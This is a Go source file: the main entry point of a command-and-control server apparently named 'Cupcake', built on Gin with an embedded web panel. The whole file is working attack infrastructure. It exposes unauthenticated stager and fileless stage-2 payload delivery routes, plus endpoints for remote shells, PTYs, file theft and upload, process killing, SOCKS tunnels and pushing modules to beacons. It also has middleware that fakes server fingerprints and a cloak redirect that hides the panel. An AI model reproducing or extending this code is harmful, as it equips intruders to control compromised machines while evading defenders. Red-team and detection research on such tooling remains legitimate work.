package main

import (
	"context"
	"crypto/tls"
	"embed"
	"fmt"
	"io/fs"
	"log"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"

	"cupcake-server/controllers"
	"cupcake-server/pkg/config"
	"cupcake-server/pkg/globals"
	"cupcake-server/pkg/logx"
	"cupcake-server/pkg/middleware"
	"cupcake-server/pkg/model"
	"cupcake-server/pkg/paths"
	"cupcake-server/pkg/store"
	"cupcake-server/pkg/utils"
	"cupcake-server/services"
)

//go:embed dist/*
var embeddedFiles embed.FS

func main() {
	cfg, err := config.LoadConfig()
	if err != nil {
		log.Fatalf("Failed to load config: %v", err)
	}
	if cfg.DataDir != "" {
		_ = os.Setenv("CUPCAKE_DATA_DIR", cfg.DataDir)
	}
	paths.Init()

	store.InitDB()
	// Wire seed: env CUPCAKE_WIRE_SEED overrides; else setting; else default (matches Client build.rs)
	wireSeed := strings.TrimSpace(os.Getenv("CUPCAKE_WIRE_SEED"))
	if wireSeed == "" {
		wireSeed = strings.TrimSpace(store.GetSetting("wire_seed"))
	}
	if wireSeed == "" {
		wireSeed = utils.DefaultWireSeed
		_ = store.SetSetting("wire_seed", wireSeed, "crypto")
	}
	utils.SetWireSeed(wireSeed)
	_ = os.Setenv("CUPCAKE_WIRE_SEED", wireSeed)

	store.ResetAllAgentsOffline()
	bootstrapAdminPassword(cfg)
	go services.RestoreListeners()
	go services.RestoreTunnels()
	services.StartAgentHealthMonitor(time.Duration(cfg.AgentStaleSecs) * time.Second)

	gin.SetMode(gin.ReleaseMode)
	adminRouter := gin.New()
	adminRouter.Use(gin.Recovery())

	// CORS: 仅允许来自同一主机的请求（C2平台无需跨域），防止 CSRF
	corsConfig := cors.DefaultConfig()
	corsConfig.AllowAllOrigins = false
	corsConfig.AllowOriginFunc = func(origin string) bool {
		// 允许同源（相同主机和端口）以及本地开发地址
		allowedPrefixes := []string{
			"http://127.0.0.1",
			"https://127.0.0.1",
			"http://localhost",
			"https://localhost",
		}
		for _, prefix := range allowedPrefixes {
			if strings.HasPrefix(origin, prefix) {
				return true
			}
		}
		return false
	}
	corsConfig.AllowHeaders = []string{"Origin", "Content-Length", "Content-Type", "Authorization"}
	adminRouter.Use(cors.New(corsConfig))

	// OpSec Middleware: Mask server fingerprints
	adminRouter.Use(func(c *gin.Context) {
		c.Writer.Header().Set("Server", "Nginx/1.18.0 (Ubuntu)")
		c.Writer.Header().Set("X-Powered-By", "PHP/7.4.3") // Fake technology stack
		c.Next()
	})

	adminRouter.Use(middleware.AuthMiddleware())

	// 🚀 Public routes (no auth required) - Stager payload delivery
	adminRouter.GET("/api/s/bin/:id", controllers.HandleServeRawPayload)
	adminRouter.GET("/api/s/:id", controllers.HandleServePayload)
	// Fileless Stage2 PIC (Donut) — short-TTL cache from /api/stager?delivery=fileless
	adminRouter.GET("/api/stage2/:id", controllers.HandleServeStage2)
	adminRouter.GET("/api/s/stage2/:id", controllers.HandleServeStage2)

	api := adminRouter.Group("/api")
	{
		api.GET("/dashboard", controllers.GetDashboard)
		api.GET("/clients", controllers.GetClients)
		api.GET("/clients/history/:uuid", controllers.HandleGetAgentHistory)
		api.DELETE("/clients/:uuid", controllers.DeleteClient)
		api.POST("/clients/migrate", controllers.MigrateClient)
		api.POST("/cmd", controllers.SendCommand)
		api.GET("/resp", controllers.GetResponse)

		api.GET("/listeners", controllers.ListListeners)
		api.POST("/listeners", controllers.CreateListener)
		api.POST("/listeners/:id/stop", controllers.StopListener)
		api.POST("/listeners/:id/start", controllers.StartListener)
		api.DELETE("/listeners/:id", controllers.DeleteListener)

		api.POST("/tunnel/start", controllers.StartTunnel)
		api.POST("/tunnel/stop", controllers.StopTunnel)
		api.POST("/tunnel/delete", controllers.DeleteTunnelController)
		api.GET("/tunnel", controllers.ListTunnels)

		api.POST("/socks/start", controllers.StartSocks)
		api.POST("/socks/stop", controllers.StopSocks)
		api.POST("/socks/delete", controllers.DeleteTunnelController)
		api.GET("/socks", controllers.ListSocks)

		files := api.Group("/files")
		{
			files.GET("/list", controllers.ListFilesController)
			files.GET("/read", controllers.ReadFileController)
			files.POST("/delete", controllers.DeleteFilesController)
			files.POST("/upload", controllers.Upload)
			files.GET("/download", controllers.HandleFsDownload)
		}

		processes := api.Group("/processes")
		{
			processes.GET("/list", controllers.ListProcesses)
			processes.POST("/kill", controllers.KillProcess)
		}

		api.GET("/shell/:uuid", controllers.HandleAdminShell)
		api.GET("/pty/:uuid", controllers.StreamPTY)

		plugins := api.Group("/plugins")
		{
			plugins.GET("", controllers.HandleListPlugins)
			plugins.POST("/run", controllers.HandleRunPlugin)
			plugins.POST("/upload", controllers.HandleUploadPlugin)
			plugins.DELETE("/:id", controllers.HandleDeletePlugin)
			plugins.GET("/result/:task_id", controllers.HandleGetPluginResult)
		}

		// L2 modules for Stage0 beacon (CKMS pack + push)
		modules := api.Group("/modules")
		{
			modules.GET("", controllers.HandleListModules)
			modules.POST("/upload", controllers.HandleUploadModule)
			modules.POST("/push", controllers.HandlePushModule)
			modules.POST("/query", controllers.HandleQueryAgentModules)
			modules.GET("/pack/:id", controllers.HandlePackModule)
		}

		api.GET("/build/logs/:task_id", controllers.HandleBuildLogsWS)

		transfer := api.Group("/transfer")
		{
			services.InitTransfer()
			transfer.POST("/upload", services.HandleAgentUpload)
			transfer.GET("/download/:filename", services.HandleAgentDownload)
			transfer.Static("/static", "./storage/public_tools")
		}

		settings := api.Group("/settings")
		{
			settings.GET("/users", controllers.HandleGetUsers)
			settings.POST("/users", controllers.HandleAddUser)
			settings.PUT("/users/:id", controllers.HandleUpdateUser)
			settings.DELETE("/users/:id", controllers.HandleDeleteUser)
			settings.GET("/logs/login", controllers.HandleGetLoginLogs)
			settings.GET("/config", controllers.HandleGetSettings)
			settings.POST("/config", controllers.HandleUpdateSettings)
			settings.GET("/webhooks", controllers.HandleGetWebhooks)
			settings.POST("/webhooks", controllers.HandleSaveWebhook)
			settings.DELETE("/webhooks/:id", controllers.HandleDeleteWebhook)
		}

		api.POST("/agents/connect", controllers.HandleConnectBindAgent)
		api.POST("/generate", controllers.HandleGenerate)
		api.GET("/generate/stream", controllers.HandleGenerateStream)
		api.GET("/stager", controllers.HandleGetStager)
		// /api/s/:id is registered as public route above (no auth)
		// 保护下载：不再致录暴露，改为通过控制器注入 AuthMiddleware 展中提供文件
		api.GET("/payloads/:filename", controllers.HandleServeProtectedPayload)

		api.POST("/auth/login", controllers.HandleLogin)
		api.POST("/auth/logout", controllers.HandleLogout)
		api.POST("/maintenance/reset", controllers.HandleMaintenanceReset)
		api.GET("/maintenance/export", controllers.HandleMaintenanceExport)
		api.POST("/maintenance/update_templates", controllers.HandleUpdateTemplates)
	}

	distFS, _ := fs.Sub(embeddedFiles, "dist")
	staticServer := http.FileServer(http.FS(distFS))

	adminRouter.NoRoute(func(c *gin.Context) {
		path := c.Request.URL.Path
		cloakTarget := store.GetSetting("opsec_cloak_url")

		// 1. Handle API 404 (Cleanup) - No Auth needed here as it's handled by middleware
		if strings.HasPrefix(path, "/api/") {
			c.Status(http.StatusNotFound)
			c.Abort()
			return
		}

		// 2. Optional cloak redirect for non-root paths (no Basic Auth popup)
		if cloakTarget != "" && path != "/" && path != "/index.html" && !strings.Contains(path, "assets") {
			c.Redirect(http.StatusFound, cloakTarget)
			return
		}

		// 3. Serve Vue SPA / static assets — login is panel form (POST /api/auth/login)
		cleanPath := strings.TrimPrefix(path, "/")
		if cleanPath == "" {
			cleanPath = "index.html"
		}
		f, err := distFS.Open(cleanPath)
		if err == nil {
			f.Close()
			staticServer.ServeHTTP(c.Writer, c.Request)
			return
		}

		// SPA Fallback
		index, err := distFS.Open("index.html")
		if err != nil {
			c.Status(http.StatusNotFound)
			return
		}
		defer index.Close()
		stat, _ := index.Stat()
		c.DataFromReader(200, stat.Size(), "text/html; charset=utf-8", index, nil)
	})

	banner := `
    ______  __    __  .______     ______      ___       __  ___  _______ 
   /      ||  |  |  | |   _  \   /      |    /   \     |  |/  / |   ____|
  |  ,----'|  |  |  | |  |_)  | |  ,----'   /  ^  \    |  '  /  |  |__   
  |  |     |  |  |  | |   ___/  |  |       /  /_\  \   |    <   |   __|  
  |  '----.|  '--'  | |  |      |  '----. /  _____  \  |  .  \  |  |____ 
   \______| \______/  | _|       \______|/__/     \__\ |__|\__\ |_______|
                                                                         
                          >> BY Timao <<
`
	fmt.Println("\x1b[35m" + banner + "\x1b[0m")
	fmt.Println("\x1b[36mC2 control plane\x1b[0m")
	scheme := "http"
	if cfg.AdminTLS {
		scheme = "https"
	}
	fmt.Printf("\x1b[32m[+]\x1b[0m Web UI: %s://%s:%d (bind %s)\n", scheme, cfg.AdminBind, cfg.AdminPort, cfg.AdminBind)
	if cfg.AdminBind == "0.0.0.0" || cfg.AdminBind == "::" {
		fmt.Printf("\x1b[33m[!]\x1b[0m Admin bind is public — use reverse proxy / IP allowlist; prefer 127.0.0.1 for lab\n")
	}
	fmt.Println("-----------------------------------------")
	fmt.Printf("\x1b[32m[+]\x1b[0m Panel form login (no Basic Auth popup); 5 fails → 5 min lock / IP\n")
	fmt.Printf("\x1b[32m[+]\x1b[0m Wire seed: %s (agent builds must use same CUPCAKE_WIRE_SEED)\n", wireSeed)
	mcpToken := store.GetSetting("system_api_token")
	if mcpToken != "" {
		fmt.Printf("\x1b[32m[+]\x1b[0m MCP API Key: %s\n", mcpToken)
	}
	fmt.Println("-----------------------------------------")
	logx.Info("admin server starting", "bind", cfg.AdminBind, "port", cfg.AdminPort, "tls", cfg.AdminTLS)

	// Display active listeners after they restore
	go func() {
		time.Sleep(2 * time.Second)
		var activePorts []string
		globals.Listeners.Range(func(key, value interface{}) bool {
			ln := value.(*globals.Listener)
			if ln.Status == "Running" {
				activePorts = append(activePorts, fmt.Sprintf("%s://0.0.0.0:%d (%s)", strings.ToLower(ln.Protocol), ln.Port, ln.ID))
			}
			return true
		})
		if len(activePorts) > 0 {
			fmt.Printf("\x1b[32m[+]\x1b[0m Active Listeners:\n")
			for _, p := range activePorts {
				fmt.Printf("    • %s\n", p)
			}
		} else {
			fmt.Printf("\x1b[33m[!]\x1b[0m No active listeners\n")
		}
	}()

	addr := fmt.Sprintf("%s:%d", cfg.AdminBind, cfg.AdminPort)
	srv := &http.Server{Addr: addr, Handler: adminRouter}

	if cfg.AdminTLS {
		var cert tls.Certificate
		var cerr error
		if cfg.AdminTLSCert != "" && cfg.AdminTLSKey != "" {
			cert, cerr = tls.LoadX509KeyPair(cfg.AdminTLSCert, cfg.AdminTLSKey)
		} else if cfg.AdminTLSAuto {
			cert, cerr = utils.GenerateSelfSignedCert([]string{"localhost", "127.0.0.1"})
		} else {
			log.Fatal("admin_tls=true requires admin_tls_cert/key or admin_tls_auto=true")
		}
		if cerr != nil {
			log.Fatalf("admin TLS cert: %v", cerr)
		}
		srv.TLSConfig = &tls.Config{Certificates: []tls.Certificate{cert}, MinVersion: tls.VersionTLS12}
	}

	go func() {
		var err error
		if cfg.AdminTLS {
			err = srv.ListenAndServeTLS("", "")
		} else {
			err = srv.ListenAndServe()
		}
		if err != nil && err != http.ErrServerClosed {
			log.Fatalf("admin server: %v", err)
		}
	}()

	// Graceful shutdown
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	sig := <-sigCh
	logx.Info("shutdown signal", "signal", sig.String())
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	_ = srv.Shutdown(ctx)
	// Stop listeners best-effort
	globals.Listeners.Range(func(key, value interface{}) bool {
		if ln, ok := value.(*globals.Listener); ok {
			services.StopListenerInstance(ln)
		}
		return true
	})
	logx.Info("admin server stopped")
}

// bootstrapAdminPassword ensures an admin user exists.
// Priority: config.AdminPass → existing DB hash → generate random (printed once).
// Set CUPCAKE_FORCE_DEV_PASS=1 to force admin/cupcake123 for lab only.
func bootstrapAdminPassword(cfg *config.ServerConfig) {
	const fixedUser = "admin"
	pass := strings.TrimSpace(cfg.AdminPass)
	forceDev := os.Getenv("CUPCAKE_FORCE_DEV_PASS") == "1" || os.Getenv("CUPCAKE_FORCE_DEV_PASS") == "true"
	if forceDev {
		pass = "cupcake123"
	}

	user, err := store.GetUserByUsername(fixedUser)
	if err != nil || user == nil {
		if pass == "" {
			// 20-char random alnum
			pass, _ = utils.RandomAlphaString(20)
			fmt.Printf("\x1b[33m[!]\x1b[0m Generated admin password (save it): %s\n", pass)
		}
		hashed, _ := store.HashPassword(pass)
		_ = store.SaveUser(&model.User{
			Username: fixedUser,
			Password: hashed,
			Role:     "admin",
			IsActive: true,
		})
		store.SetSetting("web_auth_user", fixedUser, "security")
		// Do not store plaintext password in settings in production; only for form-compat path
		if forceDev {
			store.SetSetting("web_auth_password", pass, "security")
		}
		fmt.Printf("\x1b[32m[+]\x1b[0m Created admin user %q\n", fixedUser)
		return
	}
	if forceDev && pass != "" && !store.CheckPasswordHash(pass, user.Password) {
		hashed, _ := store.HashPassword(pass)
		user.Password = hashed
		_ = store.SaveUser(user)
		store.SetSetting("web_auth_password", pass, "security")
		fmt.Printf("\x1b[33m[!]\x1b[0m Forced lab password via CUPCAKE_FORCE_DEV_PASS\n")
	}
	store.SetSetting("web_auth_user", fixedUser, "security")
}
